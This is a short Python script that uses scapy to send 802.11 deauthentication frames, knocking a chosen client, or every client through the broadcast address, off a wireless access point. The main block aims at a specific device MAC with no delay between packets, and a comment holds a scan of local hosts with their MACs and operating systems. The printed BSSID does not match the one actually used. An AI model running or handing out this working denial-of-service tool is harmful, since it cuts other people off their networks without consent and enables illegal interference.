import argparse

from scapy.all import conf, sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

# Passing arguments
# parser = argparse.ArgumentParser(prog="Scapy deauth attack",
#                                  usage="%(prog)s -i mon0 -b 00:11:22:33:44:55 -t 55:44:33:22:11:00 -c 50",
#                                  description="Scapy based wifi Deauth by @catalyst256",
#                                  allow_abbrev=False)

# parser.add_argument("-i", "--Interface", required=True,
#                     help="The interface that you want to send packets out of, needs to be set to monitor mode")
# parser.add_argument("-b", "--BSSID", required=True, help="The BSSID of the Wireless Access Point you want to target")
# parser.add_argument("-c", "--Client", required=True,
#                     help="The MAC address of the Client you want to kick off the Access Point, use FF:FF:FF:FF:FF:FF if you want a broadcasted deauth to all stations on the targeted Access Point")
# parser.add_argument("-n", "--Number", required=True, help="The number of deauth packets you want to send")

# args = parser.parse_args()

from time import sleep

# Sending deauth
conf.verb = 0
# {"192.168.1.1": {"ip": "192.168.1.1", "mac": "f8:c4:f3:b0:c5:90", "ttl": 64, "os": "Linux/Unix"}, "192.168.1.17": {"ip": "192.168.1.17", "os": "Linux/Unix", "lastActive": "Wed Nov 20 14:31:27 2024"}, "192.168.1.2": {"ip": "192.168.1.2", "os": "Linux/Unix", "lastActive": "Wed Nov 20 14:31:24 2024"}, "192.168.1.4": {"ip": "192.168.1.4", "mac": "0c:c6:fd:af:70:80", "ttl": 64, "os": "Linux/Unix"}, "192.168.1.15": {"ip": "192.168.1.15", "mac": "3c:58:c2:04:91:4c", "ttl": 128, "os": "Windows"}, "192.168.1.3": {"ip": "192.168.1.3", "mac": "28:16:7f:1b:a9:4e", "ttl": 64, "os": "Linux/Unix"}, "192.46.215.141": {"ip": "192.46.215.141", "os": "Unknown OS", "lastActive": "Wed Nov 20 14:30:36 2024"}, "192.168.1.5": {"ip": "192.168.1.5", "mac": "b8:1e:a4:b0:5f:b1", "ttl": "N/A", "os": "Unknown (No ICMP response)"}}

def start_deauth(count:int = 100, interval:int = 0.5, client_mac = "FF:FF:FF:FF:FF:FF", router_mac = "f8:c4:f3:b0:c5:90"):
    
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=client_mac, addr2=router_mac, addr3=router_mac) / Dot11Deauth(
        reason=7)

    for _ in range(count):
        sendp(packet, iface="wlan0")
        print(f"Deauth sent via: {conf.iface} to BSSID: {'24:2f:d0:6e:b2:66'} for Client: {'FF:FF:FF:FF:FF:FF'}")
        sleep(interval)

if __name__ == "__main__":
    start_deauth(client_mac="28:16:7f:1b:a9:4e", interval=0)